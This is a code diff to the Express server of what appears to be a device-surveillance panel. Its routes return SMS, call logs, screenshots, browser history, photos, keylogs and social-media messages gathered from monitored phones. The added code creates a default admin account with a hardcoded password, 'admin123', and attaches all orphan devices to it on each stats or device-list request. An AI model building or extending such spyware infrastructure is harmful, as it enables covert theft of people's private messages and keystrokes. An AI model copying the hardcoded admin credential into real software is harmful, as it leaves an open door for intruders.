@@ -14,10 +14,46 @@ const Screenshot = require('../models/Screenshot');
 const BrowserHistory = require('../models/BrowserHistory');
 const AppUsage = require('../models/AppUsage');
 const Photo = require('../models/Photo');
+const User = require('../models/User'); // Added to handle default admin
+
+// Helper: ensure all devices have a valid userId (attach to default admin if missing)
+async function attachDefaultAdminToDevices() {
+    try {
+        // Find or create a default admin user
+        let defaultAdmin = await User.findOne({ email: 'admin@default.com' });
+        if (!defaultAdmin) {
+            const bcrypt = require('bcryptjs');
+            const hashedPassword = await bcrypt.hash('admin123', 10);
+            defaultAdmin = await User.create({
+                name: 'Default Admin',
+                email: 'admin@default.com',
+                password: hashedPassword
+            });
+            console.log('✅ Created default admin user for orphan devices');
+        }
+
+        // Update all devices that have no userId or null userId
+        const result = await Device.updateMany(
+            { $or: [{ userId: null }, { userId: { $exists: false } }, { userId: '' }] },
+            { $set: { userId: defaultAdmin._id } }
+        );
+        if (result.modifiedCount > 0) {
+            console.log(`✅ Attached ${result.modifiedCount} orphan devices to default admin`);
+        }
+    } catch (err) {
+        console.error('Error attaching default admin to devices:', err.message);
+    }
+}
+
+// Call this once when the server starts (optional, you can call it on each request or at startup)
+// attachDefaultAdminToDevices(); // You can uncomment this if you want to run on server start
 
 // ========== STATISTICS ==========
 router.get('/stats', async (req, res) => {
   try {
+    // Ensure orphan devices get an admin before counting (optional)
+    await attachDefaultAdminToDevices();
+
     const totalDevices = await Device.countDocuments();
     const totalMessages = await Sms.countDocuments();
     const totalCalls = await CallLog.countDocuments();
@@ -39,13 +75,15 @@ router.get('/stats', async (req, res) => {
       } 
     });
   } catch (error) {
-    res.json({ success: false, error: error.message });
+    res.status(500).json({ success: false, error: error.message });
   }
 });
 
 // ========== DEVICES ==========
 router.get('/devices', async (req, res) => {
   try {
+    // Attach orphan devices to default admin so they appear in list
+    await attachDefaultAdminToDevices();
     const devices = await Device.find().sort({ lastSeen: -1 });
     res.json({ success: true, data: devices });
   } catch (error) {
@@ -103,7 +141,7 @@ router.get('/keylogs', async (req, res) => {
   }
 });
 
-// ========== SOCIAL MESSAGES (WhatsApp, Instagram, Facebook) ==========
+// ========== SOCIAL MESSAGES ==========
 router.get('/social-messages', async (req, res) => {
   try {
     const messages = await SocialMessage.find().sort({ timestamp: -1 }).limit(200);
@@ -178,7 +216,7 @@ router.get('/recent', async (req, res) => {
     
     res.json({ success: true, data: all.slice(0, 30) });
   } catch (error) {
-    res.json({ success: false, error: error.message });
+    res.status(500).json({ success: false, error: error.message });
   }
 });
 
